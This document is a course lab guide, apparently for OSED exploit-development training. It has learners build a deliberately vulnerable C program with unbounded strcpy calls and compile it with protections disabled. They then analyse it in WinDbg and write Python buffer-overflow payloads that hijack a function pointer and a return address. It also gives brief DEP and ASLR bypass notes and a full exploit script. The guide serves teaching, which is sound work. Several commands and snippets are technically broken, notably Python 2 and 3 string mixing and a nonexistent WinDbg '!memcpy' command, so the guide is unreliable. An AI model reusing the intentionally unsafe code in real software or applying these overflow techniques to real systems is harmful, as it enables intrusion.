# OSED Section 2.1: Consolidated Advanced/Expert Lab Guide
## Introduction to x86 Architecture - Advanced Exploitation Techniques

**Difficulty Level:** Advanced/Expert  
**Estimated Time:** 8-10 hours  
**Skills:** Memory analysis, Exploit development, Mitigation bypass, ROP chains, Multi-vector exploitation

---

## Table of Contents

1. [Lab Overview](#lab-overview)
2. [Topic 1: Advanced Memory Layout Analysis](#topic-1-advanced-memory-layout-analysis)
3. [Topic 2: Buffer Overflow Exploitation](#topic-2-buffer-overflow-exploitation)
4. [Topic 3: Multi-Vector Exploitation Techniques](#topic-3-multi-vector-exploitation-techniques)
5. [Topic 4: Advanced Memory Manipulation](#topic-4-advanced-memory-manipulation)
5. [Topic 5: Mitigation Bypass Techniques](#topic-5-mitigation-bypass-techniques)
6. [Lab Deliverables](#lab-deliverables)
7. [Troubleshooting](#troubleshooting)

---

## Lab Overview

This consolidated lab combines advanced and expert-level techniques into a comprehensive, topic-based learning experience. You will work through real-world exploitation scenarios, learning to analyze complex memory layouts, develop exploits, and bypass modern security mitigations.

### Prerequisites
- Completion of beginner/intermediate Section 2.1 labs
- Strong understanding of x86 architecture
- Familiarity with WinDbg commands
- Basic exploit development knowledge
- Understanding of stack overflows

### Lab Environment Setup

#### Required Software:
- Windows 10/11 (64-bit) - **Tested on Windows 10**
- WinDbg Preview (latest version)
- Visual Studio 2019+ or MinGW-w64 for compilation
- Python 3.8+ with pwntools (optional)
- Hex editor (HxD recommended)
- IDA Free or Ghidra (for reverse engineering)

#### Compilation Settings:
```bash
# For MinGW (32-bit)
gcc -m32 -g -fno-stack-protector -z execstack -o exploit_sample.exe exploit_sample.c

# For Visual Studio (32-bit)
cl /Zi /GS- /DYNAMICBASE:NO /NXCOMPAT:NO exploit_sample.c
```

---

## Topic 1: Advanced Memory Layout Analysis

**Duration:** 2 hours  
**Objective:** Perform comprehensive memory layout analysis to identify exploitation opportunities

### Step 1.1: Create the Vulnerable Application

**Action:** Create a new file `exploit_sample.c` with the following code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// Global variables for exploit analysis
int global_admin_flag = 0;
char global_secret[64] = "SECRET_KEY_12345";
char global_buffer[256];

// Function prototypes
void admin_function(void);
void user_function(void);
void vulnerable_function(char* input);
void exploit_target_function(void);
int check_authentication(char* username, char* password);

// Admin function - target for privilege escalation
void admin_function(void) {
    printf("*** ADMIN ACCESS GRANTED ***\n");
    printf("Secret key: %s\n", global_secret);
    printf("System access level: ROOT\n");
    global_admin_flag = 1;
}

// User function - normal user operations
void user_function(void) {
    printf("*** USER ACCESS ***\n");
    printf("Access level: USER\n");
}

// Vulnerable function with buffer overflow
void vulnerable_function(char* input) {
    char local_buffer[64];
    int local_admin_check = 0;
    void (*function_ptr)(void) = user_function;
    
    printf("Vulnerable function called\n");
    printf("Input length: %d\n", strlen(input));
    
    // Vulnerable strcpy - no bounds checking
    strcpy(local_buffer, input);
    
    printf("Local buffer: %s\n", local_buffer);
    printf("Admin check: %d\n", local_admin_check);
    printf("Function pointer: %p\n", function_ptr);
    
    // Call function through pointer
    function_ptr();
}

// Target function for exploitation
void exploit_target_function(void) {
    printf("*** EXPLOIT TARGET REACHED ***\n");
    printf("This function should not be called normally\n");
    global_admin_flag = 1;
    strcpy(global_secret, "EXPLOITED");
}

// Authentication check function
int check_authentication(char* username, char* password) {
    char local_username[32];
    char local_password[32];
    int auth_result = 0;
    
    strcpy(local_username, username);
    strcpy(local_password, password);
    
    if (strcmp(local_username, "admin") == 0 && 
        strcmp(local_password, "password") == 0) {
        auth_result = 1;
    }
    
    return auth_result;
}

int main() {
    char user_input[512];
    
    printf("=== Advanced Exploit Development Lab ===\n");
    printf("Starting vulnerable application...\n");
    
    memset(global_buffer, 0, sizeof(global_buffer));
    global_admin_flag = 0;
    
    printf("Global admin flag: %d\n", global_admin_flag);
    printf("Global secret: %s\n", global_secret);
    printf("Exploit target function address: %p\n", exploit_target_function);
    printf("Admin function address: %p\n", admin_function);
    printf("User function address: %p\n", user_function);
    
    printf("\nProcess ready for exploitation analysis...\n");
    printf("Press Enter to continue or wait 30 seconds...\n");
    
    Sleep(30000);
    
    return 0;
}
```

**Verification:** Compile the program:
```bash
gcc -m32 -g -fno-stack-protector -z execstack -o exploit_sample.exe exploit_sample.c
```

**Expected Result:** Program compiles without errors and creates `exploit_sample.exe`

---

### Step 1.2: Launch Application and Attach WinDbg

**Action 1:** Start the compiled application:
```bash
.\exploit_sample.exe
```

**Action 2:** Open WinDbg Preview

**Action 3:** Attach to the process:
- In WinDbg: `File` → `Attach to Process`
- Find `exploit_sample.exe` in the list
- Click `Attach`

**Action 4:** Load symbols:
```windbg
.reload
.sympath+ C:\Symbols
```

**Verification:** You should see:
```
ModLoad: 00400000 00405000   exploit_sample.exe
```

---

### Step 1.3: Function Address Analysis

**Step-by-Step Instructions:**

1. **Get all function addresses:**
```windbg
x exploit_sample!admin_function
x exploit_sample!user_function
x exploit_sample!exploit_target_function
x exploit_sample!vulnerable_function
x exploit_sample!check_authentication
```

**Expected Output:**
```
00401000 exploit_sample!admin_function
00401050 exploit_sample!user_function
004010a0 exploit_sample!exploit_target_function
004010f0 exploit_sample!vulnerable_function
00401150 exploit_sample!check_authentication
```

**Action:** Document these addresses - you'll need them later!

2. **Calculate function offsets:**
```windbg
? exploit_sample!exploit_target_function - exploit_sample!admin_function
? exploit_sample!vulnerable_function - exploit_sample
```

**Purpose:** Understanding relative offsets helps with ASLR bypass later

---

### Step 1.4: Global Variable Analysis

**Step-by-Step Instructions:**

1. **Find global variable addresses:**
```windbg
x exploit_sample!global_admin_flag
x exploit_sample!global_secret
x exploit_sample!global_buffer
```

2. **Examine global variable contents:**
```windbg
d exploit_sample!global_admin_flag
d exploit_sample!global_secret
d exploit_sample!global_buffer
```

3. **Calculate addresses manually:**
```windbg
? exploit_sample!global_admin_flag
? exploit_sample!global_secret
? exploit_sample!global_buffer
```

**Expected Output:**
```
00403000 exploit_sample!global_admin_flag
00403004 exploit_sample!global_secret
00403044 exploit_sample!global_buffer
```

4. **Modify global variables (practice):**
```windbg
ea exploit_sample!global_admin_flag 1
ea exploit_sample!global_secret "HACKED"
d exploit_sample!global_admin_flag
d exploit_sample!global_secret
```

**Verification:** Check that values changed correctly

---

### Step 1.5: Stack Layout Analysis

**Step-by-Step Instructions:**

1. **Set breakpoint in vulnerable function:**
```windbg
bp exploit_sample!vulnerable_function
g
```

2. **View current stack:**
```windbg
k
```

**Expected Output:**
```
00 0012ff80 004010f0 exploit_sample!vulnerable_function
01 0012ff84 00402000 exploit_sample!main+0x50
```

3. **Examine stack frame:**
```windbg
d esp
d ebp
```

4. **Analyze local variables:**
```windbg
dv
```

5. **View local variable addresses:**
```windbg
? local_buffer
? local_admin_check
? function_ptr
```

6. **Examine stack layout in detail:**
```windbg
d esp L20
```

**Analysis Task:** 
- Identify where `local_buffer` is located
- Identify where `local_admin_check` is located  
- Identify where `function_ptr` is located
- Calculate the offset from buffer start to function pointer

**Documentation:** Create a diagram showing:
```
Stack Layout (growing downward):
ESP + 0x00:  [local_buffer - 64 bytes]
ESP + 0x40:  [local_admin_check - 4 bytes]
ESP + 0x44:  [function_ptr - 4 bytes]
ESP + 0x48:  [saved EBP]
ESP + 0x4C:  [return address]
```

---

### Step 1.6: Memory Region Analysis

**Step-by-Step Instructions:**

1. **Get comprehensive memory layout:**
```windbg
!address
```

2. **Get summary:**
```windbg
!address -summary
```

3. **Find executable regions:**
```windbg
!address -f:Image
```

4. **Find heap regions:**
```windbg
!address -f:Heap
```

5. **Find stack regions:**
```windbg
!address -f:Stack
```

6. **Analyze specific memory region:**
```windbg
!address 00400000
```

**Analysis Task:** Document:
- Base address of executable code
- Base address of global variables (data segment)
- Stack base and limit
- Heap base and limit
- Memory permissions for each region

---

## Topic 2: Buffer Overflow Exploitation

**Duration:** 2.5 hours  
**Objective:** Develop and execute a buffer overflow exploit

### Step 2.1: Analyze the Vulnerable Function

**Step-by-Step Instructions:**

1. **Disassemble vulnerable function:**
```windbg
uf exploit_sample!vulnerable_function
```

**Expected Output:**
```assembly
exploit_sample!vulnerable_function:
004010f0 55              push    ebp
004010f1 8bec            mov     ebp,esp
004010f3 83ec4c          sub     esp,4Ch
004010f6 8b4508          mov     eax,dword ptr [ebp+8]
004010f9 50              push    eax
004010fa e8xxxxxxxx      call    strcpy
...
```

2. **Set breakpoint and analyze:**
```windbg
bp exploit_sample!vulnerable_function
g
```

3. **Examine function parameters:**
```windbg
d esp
d [esp+4]  ; This is the input parameter
```

4. **Examine local variables before overflow:**
```windbg
d local_buffer
d local_admin_check
d function_ptr
```

**Documentation:** Record the initial values

---

### Step 2.2: Calculate Buffer Offset

**Step-by-Step Instructions:**

1. **Create test payload:**
```python
# Create test_pattern.py
pattern = "A" * 64 + "B" * 4 + "C" * 4
print(pattern)
```

**Action:** Run this Python script and copy the output

2. **Modify the program to accept input:**
Edit `exploit_sample.c` main function:
```c
int main() {
    char user_input[512];
    
    printf("Enter input: ");
    fgets(user_input, sizeof(user_input), stdin);
    
    vulnerable_function(user_input);
    
    return 0;
}
```

3. **Recompile:**
```bash
gcc -m32 -g -fno-stack-protector -z execstack -o exploit_sample.exe exploit_sample.c
```

4. **Test in WinDbg:**
```windbg
bp exploit_sample!vulnerable_function
g
```

5. **Manually set test input:**
```windbg
ea [ebp-0x4C] "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC"
```

6. **Step through strcpy:**
```windbg
p
p
p
```

7. **Examine after overflow:**
```windbg
d local_buffer
d local_admin_check
d function_ptr
```

**Analysis:** 
- Did `local_admin_check` get overwritten? (Should see "BBBB")
- Did `function_ptr` get overwritten? (Should see "CCCC")

**Result:** You've confirmed the buffer overflow works!

---

### Step 2.3: Develop the Exploit Payload

**Step-by-Step Instructions:**

1. **Get target function address:**
From Step 1.3, you should have:
```
exploit_target_function = 0x004010a0
```

2. **Create Python exploit script:**
```python
# exploit.py
import struct

# Target address (little-endian for x86)
TARGET_FUNCTION = 0x004010a0

# Create payload
payload = "A" * 64        # Fill buffer
payload += "B" * 4        # Overwrite local_admin_check
payload += struct.pack("<I", TARGET_FUNCTION)  # Overwrite function_ptr

print("Payload length:", len(payload))
print("Payload (hex):", payload.encode('hex'))
print("\nPayload to send:")
print(repr(payload))
```

3. **Run the exploit script:**
```bash
python exploit.py
```

**Expected Output:**
```
Payload length: 72
Payload (hex): 4141414141414141...a0104000
```

4. **Save payload to file:**
```python
# Modify exploit.py to save payload
with open("payload.bin", "wb") as f:
    f.write(payload)
print("Payload saved to payload.bin")
```

---

### Step 2.4: Test Exploit in WinDbg

**Step-by-Step Instructions:**

1. **Restart application and attach WinDbg**

2. **Set breakpoint:**
```windbg
bp exploit_sample!vulnerable_function
g
```

3. **Load payload into memory:**
```windbg
.readmem payload.bin 0x00120000 L72
```

4. **Copy payload to function parameter:**
```windbg
!memcpy [ebp+8] 0x00120000 72
```

5. **Verify payload is in place:**
```windbg
d [ebp+8] L20
```

6. **Continue execution:**
```windbg
g
```

7. **Check if exploit worked:**
```windbg
d exploit_sample!global_admin_flag
d exploit_sample!global_secret
```

**Expected Result:**
- `global_admin_flag` should be 1
- `global_secret` should contain "EXPLOITED"
- You should see "*** EXPLOIT TARGET REACHED ***" in console

---

### Step 2.5: Automate Exploit Testing

**Step-by-Step Instructions:**

1. **Create automated test script:**
```python
# test_exploit.py
import subprocess
import struct
import time

TARGET_FUNCTION = 0x004010a0  # Update with actual address

payload = "A" * 64
payload += "B" * 4
payload += struct.pack("<I", TARGET_FUNCTION)

# Write payload to file
with open("payload.bin", "wb") as f:
    f.write(payload)

# Launch application
proc = subprocess.Popen(["./exploit_sample.exe"], 
                       stdin=subprocess.PIPE,
                       stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE)

# Send payload
proc.stdin.write(payload)
proc.stdin.close()

# Wait for output
time.sleep(1)
output = proc.stdout.read()

if b"EXPLOIT TARGET REACHED" in output:
    print("[+] Exploit successful!")
else:
    print("[-] Exploit failed")
    print("Output:", output)
```

2. **Run test:**
```bash
python test_exploit.py
```

---

## Topic 3: Multi-Vector Exploitation Techniques

**Duration:** 2 hours  
**Objective:** Explore multiple exploitation vectors

### Step 3.1: Return Address Overwrite

**Step-by-Step Instructions:**

1. **Analyze stack frame structure:**
```windbg
bp exploit_sample!vulnerable_function
g
k
d esp
d ebp
```

2. **Locate return address:**
```windbg
d [ebp+4]  ; Return address is at EBP+4
```

3. **Calculate offset to return address:**
```windbg
? [ebp+4] - [ebp-0x4C]  ; Offset from buffer to return address
```

**Expected:** Offset should be around 0x50 (80 bytes)

4. **Create return address overwrite payload:**
```python
# return_overwrite.py
import struct

TARGET_FUNCTION = 0x004010a0
RETURN_OFFSET = 80  # Adjust based on your analysis

payload = "A" * RETURN_OFFSET
payload += struct.pack("<I", TARGET_FUNCTION)

print("Return address overwrite payload created")
```

5. **Test return address overwrite:**
```windbg
bp exploit_sample!exploit_target_function
g
```

**Verification:** Execution should jump to `exploit_target_function`

---

### Step 3.2: Function Pointer Manipulation

**Step-by-Step Instructions:**

1. **Analyze function pointer location:**
From Step 1.5, you know `function_ptr` is at `[ebp-0x8]` (example)

2. **Create function pointer overwrite:**
```python
# function_ptr_overwrite.py
import struct

ADMIN_FUNCTION = 0x00401000  # admin_function address
FUNCTION_PTR_OFFSET = 68  # Offset from buffer start

payload = "A" * FUNCTION_PTR_OFFSET
payload += struct.pack("<I", ADMIN_FUNCTION)

print("Function pointer overwrite payload created")
```

3. **Test in WinDbg:**
```windbg
bp exploit_sample!vulnerable_function
g
ea [ebp-0x8] 0x00401000  ; Overwrite function pointer
g
```

**Expected:** Should call `admin_function` instead of `user_function`

---

### Step 3.3: Global Variable Manipulation

**Step-by-Step Instructions:**

1. **Identify global variable addresses:**
From Step 1.4, you have:
- `global_admin_flag` at 0x00403000
- `global_secret` at 0x00403004

2. **Create arbitrary write exploit:**
```python
# global_overwrite.py
import struct

# If we can control a pointer, we can write anywhere
# This is a simplified example - real exploits need pointer control

ADMIN_FLAG_ADDR = 0x00403000
SECRET_ADDR = 0x00403004

# This would require a write-what-where primitive
# For now, demonstrate in WinDbg
```

3. **Test in WinDbg:**
```windbg
ea exploit_sample!global_admin_flag 1
ea exploit_sample!global_secret "HACKED"
d exploit_sample!global_admin_flag
d exploit_sample!global_secret
```

---

## Topic 4: Advanced Memory Manipulation

**Duration:** 1.5 hours  
**Objective:** Practice advanced memory manipulation techniques

### Step 4.1: Heap Analysis

**Step-by-Step Instructions:**

1. **Create heap allocation test:**
Add to `exploit_sample.c`:
```c
void heap_test(void) {
    char* heap1 = malloc(256);
    char* heap2 = malloc(512);
    char* heap3 = malloc(1024);
    
    strcpy(heap1, "Heap allocation 1");
    strcpy(heap2, "Heap allocation 2");
    strcpy(heap3, "Heap allocation 3");
    
    printf("Heap1: %p\n", heap1);
    printf("Heap2: %p\n", heap2);
    printf("Heap3: %p\n", heap3);
    
    // Keep allocated for analysis
    Sleep(30000);
    
    free(heap1);
    free(heap2);
    free(heap3);
}
```

2. **Analyze heap in WinDbg:**
```windbg
bp exploit_sample!heap_test
g
!heap
!heap -p -a
```

3. **Examine heap chunks:**
```windbg
!heap -p -a <heap_address>
dt _HEAP_ENTRY <heap_address>
```

---

### Step 4.2: Memory Search Techniques

**Step-by-Step Instructions:**

1. **Search for specific pattern:**
```windbg
s -a 0x00400000 L?00400000 "SECRET"
```

2. **Search for function addresses:**
```windbg
s -d 0x00400000 L?00400000 0x004010a0
```

3. **Search for shellcode pattern:**
```windbg
s -b 0x00100000 L?1000000 90 90 90 90  ; NOP sled
```

---

## Topic 5: Mitigation Bypass Techniques

**Duration:** 2 hours  
**Objective:** Understand and bypass modern security mitigations

### Step 5.1: DEP Bypass Theory

**Step-by-Step Instructions:**

1. **Check DEP status:**
```windbg
!gflag
```

2. **Understand DEP:**
- DEP prevents execution of code in non-executable memory
- Stack and heap are typically non-executable
- Need ROP (Return-Oriented Programming) to bypass

3. **Find ROP gadgets:**
```windbg
# Search for common ROP gadgets
s -b 0x00400000 L?0040000 c3  ; RET instruction
s -b 0x00400000 L?0040000 58 c3  ; POP EAX; RET
s -b 0x00400000 L?0040000 59 c3  ; POP ECX; RET
```

---

### Step 5.2: ASLR Bypass Theory

**Step-by-Step Instructions:**

1. **Check ASLR status:**
```windbg
lm
```

2. **Identify non-ASLR modules:**
Modules without ASLR will have consistent base addresses

3. **Information disclosure:**
- Leak addresses from memory
- Calculate offsets
- Use leaked addresses in exploit

---

### Step 5.3: Practical Mitigation Bypass

**Note:** Full mitigation bypass requires more advanced techniques covered in later sections. This is an introduction.

**Step-by-Step Instructions:**

1. **Disable mitigations for testing:**
```bash
# Compile without mitigations
gcc -m32 -g -fno-stack-protector -z execstack -o exploit_sample.exe exploit_sample.c
```

2. **Understand the trade-offs:**
- Real exploits must work with mitigations enabled
- Each mitigation requires specific bypass techniques
- Multiple mitigations compound the challenge

---

## Lab Deliverables

### 1. Memory Layout Analysis Report
Create a comprehensive document containing:
- **Function Address Map:** All function addresses and offsets
- **Global Variable Map:** All global variable addresses
- **Stack Layout Diagram:** Detailed stack frame structure
- **Memory Region Map:** All memory regions with permissions
- **Screenshots:** WinDbg output showing analysis

### 2. Exploit Development Documentation
Document your exploit development process:
- **Vulnerability Analysis:** How you identified the vulnerability
- **Offset Calculations:** How you calculated buffer offsets
- **Payload Development:** Step-by-step payload creation
- **Testing Results:** Success/failure analysis
- **Exploit Code:** Final working exploit script

### 3. Multi-Vector Exploitation Report
Document multiple exploitation techniques:
- **Return Address Overwrite:** Technique and results
- **Function Pointer Manipulation:** Technique and results
- **Global Variable Manipulation:** Technique and results
- **Comparison:** Which technique worked best and why

### 4. Advanced Techniques Demonstration
Show advanced skills:
- **Heap Analysis:** Heap layout documentation
- **Memory Search:** Search techniques and results
- **Mitigation Analysis:** DEP/ASLR status and implications

---

## Troubleshooting

### Common Issues and Solutions

#### Issue 1: WinDbg Won't Attach
**Symptoms:** "Unable to attach to process"
**Solutions:**
- Run WinDbg as Administrator
- Check if process is already being debugged
- Verify process architecture matches (32-bit vs 64-bit)

#### Issue 2: Symbols Not Loading
**Symptoms:** Function names show as addresses only
**Solutions:**
```windbg
.sympath+ C:\Symbols
.reload /f
```

#### Issue 3: Exploit Doesn't Work
**Symptoms:** Program crashes but exploit doesn't execute
**Solutions:**
- Verify function addresses are correct
- Check payload alignment (4-byte boundaries)
- Verify buffer offset calculations
- Check for bad characters in payload

#### Issue 4: Addresses Change Between Runs
**Symptoms:** Exploit works once, then fails
**Solutions:**
- ASLR is enabled - disable for testing
- Use relative offsets instead of absolute addresses
- Implement information disclosure to leak addresses

---

## Assessment Criteria

### Excellent (90-100%):
- Complete memory layout analysis with detailed documentation
- Successful exploit development with working payload
- Multiple exploitation techniques demonstrated
- Advanced memory analysis techniques shown
- Clear, professional documentation

### Good (80-89%):
- Most memory analysis completed
- Basic exploit development successful
- Some exploitation techniques demonstrated
- Adequate documentation

### Satisfactory (70-79%):
- Basic memory analysis
- Exploit development attempted
- Limited technique demonstration
- Basic documentation

### Needs Improvement (<70%):
- Incomplete analysis
- No working exploit
- No advanced techniques
- Poor documentation

---

## Next Steps

After completing this consolidated lab:
1. Review all techniques and ensure understanding
2. Practice with variations of the vulnerable code
3. Experiment with different payloads
4. Study real-world vulnerability reports
5. Prepare for Section 2.2: Introduction to Windows Debugger

---

## Additional Resources

- **WinDbg Documentation:** https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/
- **x86 Assembly Reference:** Intel Architecture Manuals
- **Exploit Development:** Corelan Exploit Writing Tutorials
- **Buffer Overflow:** Smashing the Stack for Fun and Profit
- **ROP Techniques:** Return-Oriented Programming Explained

---

## Appendix: Complete Exploit Script

```python
#!/usr/bin/env python3
"""
OSED Section 2.1 - Complete Exploit Script
Buffer Overflow Exploit for exploit_sample.exe
"""

import struct
import sys

# Target function address (update with actual address from WinDbg)
TARGET_FUNCTION = 0x004010a0

def create_payload():
    """Create buffer overflow payload"""
    payload = b"A" * 64        # Fill local_buffer
    payload += b"B" * 4         # Overwrite local_admin_check
    payload += struct.pack("<I", TARGET_FUNCTION)  # Overwrite function_ptr
    return payload

def main():
    print("[*] OSED Section 2.1 Exploit")
    print(f"[*] Target function: 0x{TARGET_FUNCTION:08x}")
    
    payload = create_payload()
    
    print(f"[*] Payload length: {len(payload)} bytes")
    print(f"[*] Payload (hex): {payload.hex()}")
    
    # Write payload to file
    with open("payload.bin", "wb") as f:
        f.write(payload)
    print("[+] Payload saved to payload.bin")
    
    # For automated testing, uncomment:
    # import subprocess
    # proc = subprocess.Popen(["./exploit_sample.exe"], 
    #                        stdin=subprocess.PIPE)
    # proc.stdin.write(payload)
    # proc.stdin.close()
    # proc.wait()

if __name__ == "__main__":
    main()
```

---

**End of Consolidated Advanced/Expert Lab Guide**


